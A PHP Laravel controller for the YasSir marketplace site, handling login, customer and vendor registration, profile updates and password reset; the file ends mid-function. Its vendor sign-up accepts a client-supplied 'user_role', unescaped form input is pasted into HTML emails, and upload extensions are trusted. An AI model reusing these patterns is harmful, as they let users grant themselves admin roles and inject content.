<?php

namespace App\Http\Controllers;

use Activation;
use App\Http\Requests\FrontendRequest;
use App\Http\Requests\PasswordResetRequest;
use App\Http\Requests\UserRequest;
use App\Mail\Contact;
use App\Mail\ContactUser;
use App\Mail\ForgotPassword;
use App\Mail\Register;
use App\User;
use App\User_Details;
use Cartalyst\Sentinel\Checkpoints\NotActivatedException;
use Cartalyst\Sentinel\Checkpoints\ThrottlingException;
use Illuminate\Database\Eloquent\Model;
use File;
use Hash;
use Illuminate\Http\Request;
use Mail;
use Redirect;
use Reminder;
use Sentinel;
use URL;
use Validator;
use View;
use DB;
use Schema;
use Image;


class FrontEndController extends JoshController
{

   
     public function __construct()
    {
      
        $property_list = DB::table('property_listing')->get();
        $product_list = DB::table('product_listing')->get(); 
        $popular_list = DB::table('popular_categories')->get();
        $setting = DB::table('general_setting')->get();

        \View::share('property_list',$property_list);
        \View::share('product_list',$product_list);
        \View::share('popular_list',$popular_list);
        \View::share('setting',$setting);
    }
    /*
     * $user_activation set to false makes the user activation via user registered email
     * and set to true makes user activated while creation
     */
    private $user_activation = false;

    /**
     * Account sign in.
     *
     * @return View
     */
    public function getLogin()
    {   
        
        // Is the user logged in?
        if (Sentinel::check()) {
            return Redirect::route('login');
        }
        // Show the login page
        return view('login');
    }

    /**
     * Account sign in form processing.
     *
     * @return Redirect
     */
    public function postLogin(Request $request)
    {


        try {
            
            // Try to log the user in
            if ($user=  Sentinel::authenticate($request->only('email', 'password'), $request->get('remember-me', 0))) {
                //Activity log for login
                activity($user->full_name)
                    ->performedOn($user)
                    ->causedBy($user)
                    ->log('LoggedIn');
                    
                    //echo $user->user_role;exit;
                if ($user->user_role == NULL) {
                     Sentinel::logout();
                   return redirect('login')->with('error','not active account');
                }   
                else if ( $user->user_role == '5' ) {
                    return Redirect::route("my-account")->with('success', trans('auth/message.login.success'));
                } else if ( $user->user_role == '1' || $user->user_role == '4' ) {
                    return redirect('/admin');
                } else if ($user->user_role == '3') {
                    return redirect('/admin/vendorlisting');
                }

            } else {
                return redirect('login')->with('error', 'Email or password is incorrect.');
                //return Redirect::back()->withInput()->withErrors($validator);
            }

        } catch (UserNotFoundException $e) {
            $this->messageBag->add('email', trans('auth/message.account_not_found'));
        } catch (NotActivatedException $e) {
            $this->messageBag->add('email', trans('auth/message.account_not_activated'));
        } catch (UserSuspendedException $e) {
            $this->messageBag->add('email', trans('auth/message.account_suspended'));
        } catch (UserBannedException $e) {
            $this->messageBag->add('email', trans('auth/message.account_banned'));
        } catch (ThrottlingException $e) {
            $delay = $e->getDelay();
            $this->messageBag->add('email', trans('auth/message.account_suspended', compact('delay')));
        }

        // Ooops.. something went wrong
        return Redirect::back()->withInput()->withErrors($this->messageBag);
    }

    /**
     * get user details and display
     */
    public function myAccount(User $user)
    {
        $user = Sentinel::getUser();
        $countries = $this->countries;
        return view('user_account', compact('user', 'countries'));
    }

    /**
     * update user details and display
     * @param Request $request
     * @param User $user
     * @return Return Redirect
     */
    public function update_backup(User $user, FrontendRequest $request)
    {
        $user = Sentinel::getUser();
        //update values
        $user->update($request->except('password','pic','password_confirm'));

        if ($password = $request->get('password')) {
            $user->password = Hash::make($password);
        }
        // is new image uploaded?
        if ($file = $request->file('pic')) {
            $extension = $file->extension()?: 'png';
            $folderName = '/uploads/users/';
            $destinationPath = public_path() . $folderName;
            $safeName = str_random(10) . '.' . $extension;
            $file->move($destinationPath, $safeName);

            //delete old pic if exists
            if (File::exists(public_path() . $folderName . $user->pic)) {
                File::delete(public_path() . $folderName . $user->pic);
            }
            //save new file path into db
            $user->pic = $safeName;

        }

        // Was the user updated?
        if ($user->save()) {
            // Prepare the success message
            $success = trans('users/message.success.update');
            //Activity log for update account
            activity($user->full_name)
                ->performedOn($user)
                ->causedBy($user)
                ->log('User Updated successfully');
            // Redirect to the user page
            return Redirect::route('my-account')->with('success', $success);
        }

        // Prepare the error message
        $error = trans('users/message.error.update');


        // Redirect to the user page
        return Redirect::route('my-account')->withInput()->with('error', $error);


    }
    
    public function update(User $user, FrontendRequest $request)
    {
        $user = Sentinel::getUser();
        //update values
        $user->update($request->except('password','pic','password_confirm'));

        if ($password = $request->get('password')) {
        $user->password = Hash::make($password);
        }

        // is new image uploaded?
         $image = request()->file('pic');
        if($image) {
        $photo = $request->file('pic');
        $imagename = time().'.'.$photo->getClientOriginalExtension(); 
        $destinationPath = public_path('/uploads/users');
        $thumb_img = Image::make($photo->getRealPath())->resize(100, 100);
        $thumb_img->save($destinationPath.'/'.$imagename,80);
        

        $destinationPath = public_path('/normal_images');
        $photo->move($destinationPath, $imagename);
        //save image
        $user->pic = $imagename;
        }else{
            
        }

        // Was the user updated?
        if ($user->save()) {
        // Prepare the success message
        $success = trans('users/message.success.update');
        //Activity log for update account
        activity($user->full_name)
        ->performedOn($user)
        ->causedBy($user)
        ->log('User Updated successfully');
        // Redirect to the user page
        return Redirect::route('my-account')->with('success', $success);
        }
        // Prepare the error message
        $error = trans('users/message.error.update');
        // Redirect to the user page
        return Redirect::route('my-account')->withInput()->with('error', $error);
    }

   
    public function getRegister()
    {
        return abort(404);
    }

    /**
     * Account sign up form processing.
     *
     * @return Redirect
     */
    public function postRegister(UserRequest $request)
    {

        $activate = true; //make it false if you don't want to activate user automatically it is declared above as global variable
        try {
            // Register the user
            $user = Sentinel::register($request->only(['first_name', 'last_name', 'email', 'password', 'gender']), $activate);
            //add user to 'User' group
            $role = Sentinel::findRoleByName('Customer');
            $role->users()->attach($user);


            //Send mail
            $to = "info@yassir.in";
            $subject = "New Customer Signup";
            $txt = "Hi,". "\r\n\r\n";
            $txt .= $_POST['first_name']." ".$_POST['last_name']. " has registered to your website.". "\r\n\r\n";
            $txt .= "Email: ".$_POST['email']. "\r\n\r\n";
            $txt .= "Thanks!";
            $headers = "From: info@yassir.in" . "\r\n";

            mail($to,$subject,$txt,$headers);


            //Send mail
            $To = $_POST['email'];
            $subjectTo = "Registration Completed Successfully";
            $txt1 = "Welcome to YasSir". "<br><br>";
            $txt1 .= "Your Registration Completed Successfully. We appreciate you for contacting us.". "<br><br>";
            $txt1 .= "You are registered but a site administrator must review your account, you will not be able to login until your account has been approved. One of our customer happiness members will be getting back to you within a few hours.". "<br><br>";

            $txt1 .= "Thanks in advance for your patience.". "<br><br>";

            $txt1 .= "If You have any Questions About our services, we invite you to call us immediately at <b>7575081000</b> and Happy to Assist you.". "<br><br>";

            $txt1 .= "Thanks & Regards"."<br>";

            $txt1 .= "<img src='https://dev.yassir.in/public/images/yassir_small.png'>". "\r\n";
            $headers = "From: YasSir <info@yassir.in>" . "\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";

            mail($To,$subjectTo,$txt1,$headers);

            DB::table('users')
                    ->where('id', $user->id)
                    ->update(['user_role' => '5']);

            //if you set $activate=false above then user will receive an activation mail
            if (!$activate) {
                // Data to be used on the email view

                $data=[
                    'user_name' => $user->first_name .' '. $user->last_name,
                    'activationUrl' => URL::route('activate', [$user->id, Activation::create($user)->code]),
                ];
                // Send the activation code through email

                                // the message
                $msg = $data['activationUrl'];

                //Redirect to login page
                return redirect('login')->with('success', 'Account successfully created. Please check your mail box.');
            }
            // login user automatically
            Sentinel::login($user, false);
            //Activity log for new account
            activity($user->full_name)
                ->performedOn($user)
                ->causedBy($user)
                ->log('New Account created');
            // Redirect to the home page with success menu
            return Redirect::route("my-account")->with('success', trans('auth/message.signup.success'));

        } catch (UserExistsException $e) {
            $this->messageBag->add('email', trans('auth/message.account_already_exists'));
        }

        // Ooops.. something went wrong
        return Redirect::back()->withInput()->withErrors($this->messageBag);
    }

    /**
     * Vendor Account Register.
     *
     * @return View
     */
    public function getVRegister()
    {

        //Get Type values
        $type = $this->getTypeList('1');

        // Show the page
        return view('vregister')->with('type',$type);
    }

    public function getTypeList($type_id) {

        switch ($type_id) {
            case '1':
                $type = DB::table('category_type_properties')->get()->toArray();
                break;
            case '2':
                $type = DB::table('category_type_consultancy')->get()->toArray();
                break;
            case '3':
                $type = DB::table('category_type_contractor')->get()->toArray();
                break;
            case '4':
                $type = DB::table('category_type_material')->get()->toArray();
                break;
            case '5':
                $type = DB::table('category_type_skill_labour')->get()->toArray();
                break;    
        }

        return $type;
    }

    public function postVRegister(Request $request)
    {

        $this->validate($request,
        ['first_name' => 'required',
        'last_name' => 'required',
        'company_name' => 'required',
        'email' => 'required|email',
        'password' => 'required',
        'conform_password' => 'required|same:password',
        'address' => 'required',
        'mobile' => 'required|numeric',
        'zipcode' => 'required',
        'city' => 'required',
        'gst_number' => 'required',
        'user_state' => 'required',
        'user_category' => 'required',
        'user_sub_cate' => 'required'
        ],
        [
         'first_name.required' => 'First name is required',
         'last_name.required' => 'Last name is required',
         'email.required' => 'Email is required',
         'email.email' => 'Email is not valid',
         'company_name.required' => 'Company name is required',
         'password.required' => 'Password is required',
         'conform_password.required' => 'Confirm password is required',
          'conform_password.same' => 'Password is not match',
         'address.required' => 'Address is required',
         'mobile.required' => 'Mobile number is required',
         'zipcode.required' => 'Zipcode is required',
         'city.required' => 'City name is required',
         'gst_number.required' => 'Gst number is required',
         'user_state.required' => 'State is required',
         'user_category.required' => 'Category is required',
         'user_sub_cate.required' => 'Sub category is required'
        ]);




        //check email is already exist in system
        $users = DB::table('users')
                     ->select(DB::raw('count(*) as user_count'))
                     ->where('email', '=', $request->input('email'))
                     ->get()
                     ->toArray();

        if ($users[0]->user_count > 0) {
            return redirect('becomevendor')->withInput()->with('error', 'Email already registered.');

        } else {

            $activate = $this->user_activation; //make it false if you don't want to activate user automatically it is declared above as global variable

            // Register the user
           
             $user = Sentinel::register($request->only(['first_name', 'last_name', 'email', 'password','phone','mobile','address','city','zipcode','company_name','user_state','user_category','user_sub_cate','trade_name','gst_number','user_role']), $activate);


            //add user to 'User' group
            $role = Sentinel::findRoleByName('Vendor');
            $role->users()->attach($user);
            //if you set $activate=false above then user will receive an activation mail
            if (!$activate) {
                // Data to be used on the email view

                $data=[
                    'user_name' => $user->first_name .' '. $user->last_name,
                    'activationUrl' => URL::route('activate', [$user->id, Activation::create($user)->code]),
                ];

                $to = "support@yassir.in";
                $subject = "New Customer Signup";
                $txt = "Hi,". "\r\n\r\n";
                $txt = "<html>
                        <head>
                            <title>Welcome</title>
                        </head>
                    <body>
                    <h1>Thanks you for joining with us!</h1>
                    <table cellspacing='0' style='width: 300px; height: 200px;'>
                        <tr>
                            <th>Name:</th><td>".$_POST['first_name']."  ".$_POST['last_name']. "</td>
                        </tr>
                        <tr>
                            <th>Phone:</th><td>".$_POST['mobile']."</td>
                        </tr>
                        <tr>
                            <th>Email:</th><td>".$_POST['email']."</td>
                        </tr>
                    </table>
                    </body>
                    </html>";

                $txt .= "Thanks!";
                $headers = "From: support@yassir.in" . "\r\n";
                $headers .= "MIME-Version: 1.0\r\n";
                $headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";

                mail($to,$subject,$txt,$headers);


                //Send mail
                $To = $_POST['email'];
                $subjectTo = "Registration Completed Successfully";
                $txt1 = "Welcome to YasSir". "<br><br>";
                $txt1 .= "Your Registration Completed Successfully. We appreciate you for contacting us.". "<br><br>";
                $txt1 .= "You are registered but a site administrator must review your account, you will not be able to login until your account has been approved. One of our customer happiness members will be getting back to you within a few hours.". "<br><br>";

                $txt1 .= "Thanks in advance for your patience.". "<br><br>";

                $txt1 .= "If You have any Questions About our services, we invite you to call us immediately at <b>75750810001234</b> and Happy to Assist you.". "<br><br>";

                $txt1 .= "Thanks & Regards"."<br>";
                
               $txt1 .='<table align="left" cellpadding="0" cellspacing="0" style="max-width:450px; width:100%;">
                    <tbody style="border:0;">
                        <tr>
                        <td width="150px" valign="top"><img src="http://yassir.in/public/assets/images/yassir_small.png" style="width:150px;"></td>
                            <td style="padding:0 15px 10px 15px; color:#666; font-weight: blod; border:0"  valign="top">
                        <table cellpadding="0"  valign="top" cellspacing="0" style="max-width:450px; width:100%; border:0">
                            <tbody style="border:0;">
                                <tr>
                                <td  style="color:#888; font-family: Arial, Helvetica, sans-serif; border:0; font-size: 14px; font-weight:bold; font-style: italic">
                            YasSir
                            </td>
                         </tr>
                        <tr>
                        <td style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">7575081000  <span style="color:#f00; display: inline-block">|</span> </td>
                        </tr>
                        <tr>
                        <td style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">Golden arcade, SF, 07, GIDC Electronic<br>Estate, Sector 25, Gandhinagar, Gujarat  </td>
                            </tr>
                            <tr>
                            <td style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">
                              382027 <span style="color:#f00; display: inline-block; margin:0 3px;">|</span><a href="mailto:info@yassir.in" style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">info@yassir.in </a><span style="color:#f00; display: inline-block; margin:0 3px;">|</span><a href="http://www.yassir.in" style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">www.yassir.in </a>  </td>
                          </tr>
                          <tr>
                            <td style="padding: 8px 0 0 0;">
                              <a href="#" style="display: inline-block; margin: 3px 3px 3px 0;"><img src="http://www.yassir.in/public/assets/images/fb-icon.png" style="width:20px;"></a>
                                  <a href="#" style="display: inline-block; margin: 3px 3px 3px 0;"><img src="http://www.yassir.in/public/assets/images/twt-icon.png" style="width:20px;"></a>
                                  <a href="#" style="display: inline-block; margin: 3px 3px 3px 0;"><img src="http://www.yassir.in/public/assets/images/insta-icon.png" style="width:20px;"></a>

                              </td>
                          </tr>

                            </tbody>
                        </table>
                    </td>
                </tr>
                </tbody>
            </table>';
                $headers = "From: YasSir <support@yassir.in>" . "\r\n";
                $headers .= "MIME-Version: 1.0\r\n";
                $headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";

            mail($To,$subjectTo,$txt1,$headers);
                //Redirect to home page
                return redirect('login')->with('success', trans('auth/message.signup.success'));
            }
        }
    }
    public function postVRegister123(Request $request)
    {
        //check email is already exist in system
        $users = DB::table('users')
                     ->select(DB::raw('count(*) as user_count'))
                     ->where('email', '=', $request->input('email'))
                     ->get()
                     ->toArray();

        if ($users[0]->user_count > 0) {
            return redirect('becomevendor')->withInput()->with('error', 'Email already registered.');

        } else {

            $activate = $this->user_activation; //make it false if you don't want to activate user automatically it is declared above as global variable

            // Register the user
           
             $user = Sentinel::register($request->only(['first_name', 'last_name', 'email', 'password','mobile','address','city','zipcode','company_name','user_state','user_category','user_sub_cate','gst_number']), $activate);


            //add user to 'User' group
            $role = Sentinel::findRoleByName('Vendor');
            $role->users()->attach($user);
            //if you set $activate=false above then user will receive an activation mail
            if (!$activate) {
                // Data to be used on the email view

                $data=[
                    'user_name' => $user->first_name .' '. $user->last_name,
                    'activationUrl' => URL::route('activate', [$user->id, Activation::create($user)->code]),
                ];




                //mail to support

                $to = "support@yassir.in";
                $subject = "New Vendor Registration";
                $txt = "Hi,". "\r\n\r\n";
                $txt = "<html>
                        <head>
                            <title>Welcome</title>
                        </head>
                    <body>
                    <h1>Thanks you for joining with us!</h1>
                    <table cellspacing='0' style='width: 300px; height: 200px;'>
                        <tr>
                            <th>Name:</th><td>".ucfirst($_POST['first_name']."  ".$_POST['last_name']). "</td>
                        </tr>
                        <tr>
                            <th>Phone:</th><td>".$_POST['mobile']."</td>
                        </tr>
                        <tr>
                            <th>Email:</th><td>".$_POST['email']."</td>
                        </tr>
                    </table>
                    </body>
                    </html>";

                $txt .= "Thanks!";
                $headers = "From: support@yassir.in" . "\r\n";
                $headers .= "MIME-Version: 1.0\r\n";
                $headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
                mail($to,$subject,$txt,$headers);






                //Send mail to user
                $To = $_POST['email'];
                $subjectTo = "Registration Completed Successfully";
                $txt1 = "Welcome to YasSir". "<br><br>";
                $txt1 .= "Your Registration Completed Successfully. We appreciate you for contacting us.". "<br><br>";
                $txt1 .= "You are registered but a site administrator must review your account, you will not be able to login until your account has been approved. One of our customer happiness members will be getting back to you within a few hours.". "<br><br>";

                $txt1 .= "Thanks in advance for your patience.". "<br><br>";

                $txt1 .= "If You have any Questions About our services, we invite you to call us immediately at <b>75750810001234</b> and Happy to Assist you.". "<br><br>";

                $txt1 .= "Thanks & Regards"."<br>";
                
               $txt1 .='<table align="left" cellpadding="0" cellspacing="0" style="max-width:450px; width:100%;">
                    <tbody style="border:0;">
                        <tr>
                        <td width="150px" valign="top"><img src="http://yassir.in/public/assets/images/yassir_small.png" style="width:150px;"></td>
                            <td style="padding:0 15px 10px 15px; color:#666; font-weight: blod; border:0"  valign="top">
                        <table cellpadding="0"  valign="top" cellspacing="0" style="max-width:450px; width:100%; border:0">
                            <tbody style="border:0;">
                                <tr>
                                <td  style="color:#888; font-family: Arial, Helvetica, sans-serif; border:0; font-size: 14px; font-weight:bold; font-style: italic">
                            YasSir
                            </td>
                         </tr>
                        <tr>
                        <td style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">7575081000  <span style="color:#f00; display: inline-block">|</span> </td>
                        </tr>
                        <tr>
                        <td style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">Golden arcade, SF, 07, GIDC Electronic<br>Estate, Sector 25, Gandhinagar, Gujarat  </td>
                            </tr>
                            <tr>
                            <td style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">
                              382027 <span style="color:#f00; display: inline-block; margin:0 3px;">|</span><a href="mailto:info@yassir.in" style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">info@yassir.in </a><span style="color:#f00; display: inline-block; margin:0 3px;">|</span><a href="http://www.yassir.in" style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">www.yassir.in </a>  </td>
                          </tr>
                          <tr>
                            <td style="padding: 8px 0 0 0;">
                              <a href="#" style="display: inline-block; margin: 3px 3px 3px 0;"><img src="http://www.yassir.in/public/assets/images/fb-icon.png" style="width:20px;"></a>
                                  <a href="#" style="display: inline-block; margin: 3px 3px 3px 0;"><img src="http://www.yassir.in/public/assets/images/twt-icon.png" style="width:20px;"></a>
                                  <a href="#" style="display: inline-block; margin: 3px 3px 3px 0;"><img src="http://www.yassir.in/public/assets/images/insta-icon.png" style="width:20px;"></a>

                              </td>
                          </tr>

                            </tbody>
                        </table>
                    </td>
                </tr>
                </tbody>
            </table>';
                $headers = "From: YasSir <support@yassir.in>" . "\r\n";
                $headers .= "MIME-Version: 1.0\r\n";
                $headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
                mail($To,$subjectTo,$txt1,$headers);


                //Redirect to home page
                return redirect('login')->with('success', trans('auth/message.signup.success'));
            }
        }
    }

     public function postVRegister_backup(Request $request)
    {
        //check email is already exist in system
        $users = DB::table('users')
                     ->select(DB::raw('count(*) as user_count'))
                     ->where('email', '=', $request->input('email'))
                     ->get()
                     ->toArray();

        if ($users[0]->user_count > 0) {
            return redirect('becomevendor')->withInput()->with('error', 'Email already registered.');

        } else {

            $activate = $this->user_activation; //make it false if you don't want to activate user automatically it is declared above as global variable

            // Register the user
            $user = Sentinel::register($request->only(['first_name', 'last_name', 'email', 'password', 'gender']), $activate);
            //add user to 'User' group
            $role = Sentinel::findRoleByName('Vendor');
            $role->users()->attach($user);
            //if you set $activate=false above then user will receive an activation mail
            if (!$activate) {
                // Data to be used on the email view

                $data=[
                    'user_name' => $user->first_name .' '. $user->last_name,
                    'activationUrl' => URL::route('activate', [$user->id, Activation::create($user)->code]),
                ];



                $to = "info@yassir.in";
                $subject = "New Customer Signup";
                $txt = "Hi,". "\r\n\r\n";
                $txt = "<html>
                        <head>
                            <title>Welcome</title>
                        </head>
                    <body>
                    <h1>Thanks you for joining with us!</h1>
                    <table cellspacing='0' style='width: 300px; height: 200px;'>
                        <tr>
                            <th>Name:</th><td>".$_POST['first_name']."  ".$_POST['last_name']. "</td>
                        </tr>
                        <tr>
                            <th>Phone:</th><td>".$_POST['mobile']."</td>
                        </tr>
                        <tr>
                            <th>Email:</th><td>".$_POST['email']."</td>
                        </tr>
                    </table>
                    </body>
                    </html>";

                $txt .= "Thanks!";
                $headers = "From: info@yassir.in" . "\r\n";
                $headers .= "MIME-Version: 1.0\r\n";
                $headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";

                mail($to,$subject,$txt,$headers);


                //Send mail
                $To = $_POST['email'];
                $subjectTo = "Registration Completed Successfully";
                $txt1 = "Welcome to YasSir". "<br><br>";
                $txt1 .= "Your Registration Completed Successfully. We appreciate you for contacting us.". "<br><br>";
                $txt1 .= "You are registered but a site administrator must review your account, you will not be able to login until your account has been approved. One of our customer happiness members will be getting back to you within a few hours.". "<br><br>";

                $txt1 .= "Thanks in advance for your patience.". "<br><br>";

                $txt1 .= "If You have any Questions About our services, we invite you to call us immediately at <b>75750810001234</b> and Happy to Assist you.". "<br><br>";

                $txt1 .= "Thanks & Regards"."<br>";
                
               $txt1 .='<table align="left" cellpadding="0" cellspacing="0" style="max-width:450px; width:100%;">
                    <tbody style="border:0;">
                        <tr>
                        <td width="150px" valign="top"><img src="http://yassir.in/public/assets/images/yassir_small.png" style="width:150px;"></td>
                            <td style="padding:0 15px 10px 15px; color:#666; font-weight: blod; border:0"  valign="top">
                        <table cellpadding="0"  valign="top" cellspacing="0" style="max-width:450px; width:100%; border:0">
                            <tbody style="border:0;">
                                <tr>
                                <td  style="color:#888; font-family: Arial, Helvetica, sans-serif; border:0; font-size: 14px; font-weight:bold; font-style: italic">
                            YasSir
                            </td>
                         </tr>
                        <tr>
                        <td style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">7575081000  <span style="color:#f00; display: inline-block">|</span> </td>
                        </tr>
                        <tr>
                        <td style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">Golden arcade, SF, 07, GIDC Electronic<br>Estate, Sector 25, Gandhinagar, Gujarat  </td>
                            </tr>
                            <tr>
                            <td style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">
                              382027 <span style="color:#f00; display: inline-block; margin:0 3px;">|</span><a href="mailto:info@yassir.in" style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">info@yassir.in </a><span style="color:#f00; display: inline-block; margin:0 3px;">|</span><a href="http://www.yassir.in" style="color:#888; border:0; font-size: 14px;  font-family: Arial, Helvetica, sans-serif; font-weight:bold;">www.yassir.in </a>  </td>
                          </tr>
                          <tr>
                            <td style="padding: 8px 0 0 0;">
                              <a href="#" style="display: inline-block; margin: 3px 3px 3px 0;"><img src="http://www.yassir.in/public/assets/images/fb-icon.png" style="width:20px;"></a>
                                  <a href="#" style="display: inline-block; margin: 3px 3px 3px 0;"><img src="http://www.yassir.in/public/assets/images/twt-icon.png" style="width:20px;"></a>
                                  <a href="#" style="display: inline-block; margin: 3px 3px 3px 0;"><img src="http://www.yassir.in/public/assets/images/insta-icon.png" style="width:20px;"></a>

                              </td>
                          </tr>

                            </tbody>
                        </table>
                    </td>
                </tr>
                </tbody>
            </table>';
                $headers = "From: YasSir <info@yassir.in>" . "\r\n";
                $headers .= "MIME-Version: 1.0\r\n";
                $headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";

            mail($To,$subjectTo,$txt1,$headers);

                DB::table('users')
                    ->where('id', $user->id)
                    ->update(['city' => $request->input('city'), 'address' => $request->input('address'), 'user_state' => $request->input('state'), 'user_role' => '3', 'user_category' => $request->input('category'), 'user_sub_cate' => $request->input('types1'), 'company_name' => $request->input('company_name')]);

                DB::table('user_details')
                    ->insert(['user_id' => $user->id, 'user_phone' => $request->input('phone'), 'user_mobile' => $request->input('mobile'), 'user_zipcode' => $request->input('zipcode'), 'user_category' => $request->input('category'), 'user_sub_category' => $request->input('types1'), 'user_gstn' => $request->input('gst_number'), 'user_city' => $request->input('city'), 'user_address' => $request->input('address')]);

                //Redirect to home page
                return redirect('login')->with('success', trans('auth/message.signup.success'));
            }
        }
    }

    public function post123VRegister(Request $request)
    {
        //check email is already exist in system
        $users = DB::table('users')
                     ->select(DB::raw('count(*) as user_count'))
                     ->where('email', '=', $request->input('email'))
                     ->get()
                     ->toArray();

        if ($users[0]->user_count > 0) {
            return redirect('becomevendor')->withInput()->with('error', 'Email already registered.');

        } else {

            $activate = $this->user_activation; //make it false if you don't want to activate user automatically it is declared above as global variable

            // Register the user
            $user = Sentinel::register($request->only(['first_name', 'last_name', 'email', 'password', 'gender']), $activate);
            //add user to 'User' group
            $role = Sentinel::findRoleByName('Vendor');
            $role->users()->attach($user);
            //if you set $activate=false above then user will receive an activation mail
            if (!$activate) {
                // Data to be used on the email view

                $data=[
                    'user_name' => $user->first_name .' '. $user->last_name,
                    'activationUrl' => URL::route('activate', [$user->id, Activation::create($user)->code]),
                ];



                // Send the activation code through email

/*                Mail::to($user->email)
                    ->send(new Register($data));*/

                //Send mail
                $to = "info@yassir.in";
                $subject = "New Registration";
                $txt = "Hi,". "\r\n\r\n";
                $txt .= $_POST['first_name']." ".$_POST['last_name']. " has registered to your website.". "\r\n\r\n";
                $txt .= "Email: ".$_POST['email']. "\r\n";
                $txt .= "Phone: ".$_POST['mobile']. "\r\n";
                $txt .= "Mobile: ".$_POST['mobile']. "\r\n\r\n";
                $txt .= "Thanks!";
                $headers = "From: info@yassir.in" . "\r\n";

                mail($to,$subject,$txt,$headers);


                //Send mail
                $To = $_POST['email'];
                $subjectTo = "Welcome to Yassir.in";
                $txt1 = "Hi,". "<br><br>";
                $txt1 .= "Welcome to Yas sir.". "<br><br>";
                $txt1 .= "Thanking you for giving your precious time. We are proud to welcome satisfied client and look forward to many years of working together.". "<br><br>";
                $txt1 .= "Our team is reviewing your profile. You will be contacted by our team soon."."<br><br>";
                $txt1 .= "If you have any questions about our services, we invite you to call us immediately at 7575081000 , and we will be Happy to assist you.". "<br><br>";
                $txt1 .= "Once again, Thanks for your support.". "<br><br>";

                $txt1 .= "Thanks". "<br>";
                //$txt1 .= "YasSir Team". "<br>";
                $txt1 .= "<img src='https://yassir.in/public/images/yassir_small.png'>". "\r\n";
                $headers = "From: YasSir <info@yassir.in>" . "\r\n";
                $headers .= "MIME-Version: 1.0\r\n";
                $headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";

                mail($To,$subjectTo,$txt1,$headers);

                DB::table('users')
                    ->where('id', $user->id)
                    ->update(['city' => $request->input('city'), 'address' => $request->input('address'), 'user_state' => $request->input('state'), 'user_role' => '3', 'user_category' => $request->input('category'), 'user_sub_cate' => $request->input('types1'), 'company_name' => $request->input('company_name')]);

                DB::table('user_details')
                    ->insert(['user_id' => $user->id, 'user_phone' => $request->input('phone'), 'user_mobile' => $request->input('mobile'), 'user_zipcode' => $request->input('zipcode'), 'user_category' => $request->input('category'), 'user_sub_category' => $request->input('types1'), 'user_gstn' => $request->input('gst_number'), 'user_city' => $request->input('city'), 'user_address' => $request->input('address')]);

                //Redirect to home page
                return redirect('login')->with('success', trans('auth/message.signup.success'));
            }
        }
    }


    /**
     * User account activation page.
     *
     * @param number $userId
     * @param string $activationCode
     *
     */
    public function getActivate($userId, $activationCode)
    {
        // Is the user logged in?
        if (Sentinel::check()) {
            return Redirect::route('my-account');
        }

        $user = Sentinel::findById($userId);

        if (Activation::complete($user, $activationCode)) {
            // Activation was successfull
            return Redirect::route('login')->with('success', trans('auth/message.activate.success'));
        } else {
            // Activation not found or not completed.
            $error = trans('auth/message.activate.error');
            return Redirect::route('login')->with('error', $error);
        }
    }

    /**
     * Forgot password page.
     *
     * @return View
     */
    public function getForgotPassword()
    {
        // Show the page forgotpass
        return view('forgotpwd');

    }

    public function postForgotPassword(Request $request)
    {
        try {
            // Get the user password recovery code
            $user = Sentinel::findByCredentials(['email' => $request->email]);
            if (!$user) {
                return Redirect::route('forgot-password')->with('error', trans('auth/message.account_email_not_found'));
            }

            $activation = Activation::completed($user);
            if (!$activation) {
                return Redirect::route('forgot-password')->with('error', trans('auth/message.account_not_activated'));
            }

            $reminder = Reminder::exists($user) ?: Reminder::create($user);
            // Data to be used on the email view

            $data=[
                'user_name' => $user->first_name .' '. $user->last_name,
                'forgotPasswordUrl' => URL::route('forgot-password-confirm', [$user->id, $reminder->code])
            ];
            // Send the activation code through email
/*            Mail::to($user->email)
                ->send(new ForgotPassword($data));*/

            //Send mail
            $To = $user->email;
            $subjectTo = "Rest Password - Yassir";
             $txt1 = "Greetings from YasSir" ."<br>".
                     "Have a good day" ."<br>";
            $txt1 .= "Hi ".ucfirst($data['user_name'])."<br>";"<br><br>";
            $txt1 .= "Reset your password with below link.". "<br><br>";
            $txt1 .= $data['forgotPasswordUrl']. "<br><br>";

            $txt1 .= "Thanks". "<br><br>";

            $txt1 .= "<img src='https://yassir.in/public/images/logo-black.png'>". "\r\n";
            $headers = "From: YasSir <support@yassir.in>" . "\r\n";
            $headers .= "MIME-Version: 1.0\r\n";
            $headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";

            mail($To,$subjectTo,$txt1,$headers);


        } catch (UserNotFoundException $e) {
            // Even though the email was not found, we will pretend
            // we have sent the password reset code through email,
            // this is a security measure against hackers.
        }

        //  Redirect to the forgot password
        return back()->with('success', trans('auth/message.forgot-password.success'));
    }

    public function getForgotPasswordConfirm(Request $request, $userId, $passwordResetCode = null)
    {
        if (!$user = Sentinel::findById($userId)) {
            // Redirect to the forgot password page
